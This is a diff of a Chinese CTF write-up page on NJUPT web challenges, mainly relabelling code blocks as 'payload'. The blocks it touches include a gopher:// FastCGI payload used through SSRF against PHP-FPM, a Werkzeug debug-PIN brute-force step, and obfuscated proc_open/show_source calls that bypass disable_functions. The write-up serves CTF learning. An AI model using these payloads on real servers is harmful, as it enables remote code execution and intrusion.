@@ -300,25 +300,20 @@ $phar-&gt;stopBuffering();
 <p>在换成<strong>ARP表（/proc/net/arp）</strong>，发现有两个内网IP</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-8.png" alt="4-8"></p>
 <p>将生成phar文件的<strong>Metadata</strong>部分改为<strong>http</strong>协议，访问<strong>10.0.0.3</strong>。发现<strong>FPM</strong></p>
-<pre><code class="code">http://10.0.0.3
+<pre><code class="payload">http://10.0.0.3
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-9.png" alt="4-9"></p>
 <p>接下来思路就是<strong> ssrf+gopher打fpm</strong>，参考文章：<a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">攻击PHP-FPM</a></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-10.png" alt="4-10"></p>
 <p>然后将开头的<strong>127.0.0.1</strong>改为<strong>10.0.0.3</strong>，端口默认<strong>9000</strong>不用改，写入phar的payload</p>
-<pre><code class="php">$this-&gt;url = &quot;gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00&quot;;
+<pre><code class="payload">$this-&gt;url = &quot;gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00&quot;;
 </code></pre>
 <p>上传然后访问，成功返回</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-11.png" alt="4-11"></p>
 <p><strong>open_basedir</strong>是<strong> /var/www/html:/tmp </strong></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-12.png" alt="4-12"></p>
 <p><strong>disable_functions</strong>如下</p>
-<pre><code class="code">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
-pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,
-pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,
-pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,
-pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,
-symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delete,copy,rmdir
+<pre><code class="disable_functions">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delete,copy,rmdir
 </code></pre>
 <p>用绕过open_basedir的payload</p>
 <p>Ps：还是要记得127.0.0.1改成10.0.0.3</p>
@@ -393,7 +388,6 @@ else{
     die(&#39;nonono _ is bad&#39;);
 }
 ?&gt;
-
 </code></pre>
 <p>三层 WAF，慢慢来</p>
 <p>第一层：① %0a 绕过 preg_match() 的匹配</p>
@@ -546,7 +540,6 @@ if rv is None:
         rv = num
 
 print(rv)
-
 </code></pre>
 <p>爆破出PIN码（因为mathine-id一直在变化，所以爆破出来尽快使用）</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-8.png" alt="9-8"></p>
@@ -591,7 +584,6 @@ if(file_exists($usrful)){
         die(&quot;oh,不能输入这些函数哦 :) &quot;);
     }
 }
-
 </code></pre>
 <p><strong>get_defined_functions()</strong></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-2.png" alt="11-2"></p>
@@ -601,24 +593,18 @@ if(file_exists($usrful)){
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-4.png" alt="11-4"></p>
 <p>我们可以通过以下方式来执行命令</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-5.png" alt="11-5"></p>
-<p>disable_function 如下</p>
-<pre><code class="code">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
-pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,
-pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,
-pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
-pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,
-error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,
-delete
+<p>disable_functions 如下</p>
+<pre><code class="disable_functions">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete
 </code></pre>
 <p>发现<strong>proc_open()</strong>没有被禁用，可以用过它来命令执行，查看flag。但是并不知道flag的路径，但是发现根目录下有<strong>/readflag</strong></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-6.png" alt="11-6"></p>
 <p>跑这个文件应该就可以拿下flag，因为<strong>proc_open()</strong>没有直接地结果返回，我们可以将其结果输出到一个文件，再去读取这个文件，payload如下</p>
 <p>Ps：题目环境不允许重复写文件，过后读也不行，所以打的时候换个文件，马上打马上读</p>
-<pre><code class="code">?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z);
+<pre><code class="payload">?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z);
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-7.png" alt="11-7"></p>
 <p>拿下flag</p>
-<pre><code class="code">?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);
+<pre><code class="payload">?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-8.png" alt="11-8"></p>
 
